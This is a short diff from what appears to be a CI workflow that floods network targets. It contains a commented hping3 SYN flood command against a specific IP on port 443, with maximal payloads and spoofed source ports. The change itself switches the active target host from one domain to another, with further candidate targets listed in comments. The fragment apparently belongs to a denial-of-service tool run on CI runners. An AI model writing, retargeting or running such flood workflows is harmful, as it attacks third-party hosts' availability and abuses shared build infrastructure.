@@ -77,10 +77,10 @@ jobs:
           # sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 154.198.240.70 || true
 
           # Alibaba
-          # IP="80ym.com"
+          IP="80ym.com"
           # IP="45.249.209.34"
           # IP="www.enk7h.vip"
-          IP="ngk86.vip"
+          # IP="ngk86.vip"
           TIMEOUT=2
 
           # Cloudflare
